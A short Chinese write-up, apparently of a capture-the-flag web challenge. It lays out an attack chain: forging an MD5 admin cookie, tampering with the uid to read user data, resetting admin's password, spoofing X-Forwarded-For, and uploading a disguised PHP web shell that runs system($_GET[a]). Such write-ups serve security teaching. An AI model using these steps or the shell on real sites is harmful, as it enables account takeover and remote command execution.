先创建一个账号

然后登进去发现在cookie：a1ca81cc20da244323498b26f4a5051a（感觉一般都是md5加密）

这里是5:cyny666

伪造一个1:admin的md5:4b9987ccafacb8d8fc08d22bbca797ba

personal那里查看个人信息的时候修改数据包uid和cookie

获取基本信息

| Birthday | 1993/01/01         |
| -------- | ------------------ |
| Address  | 福建省福州市闽侯县 |

然后可以在找密码的时候输入信息修改admin的密码

在manage模块发送包的时候加入X-Forwarded-For:127.0.0.1

然后看页面码有<!-- index.php?module=filemanage&do=???-->

然后上传文件构造一个jpg文件即可 注意绕过<?php

<script language="php">system($_GET[a]);</script>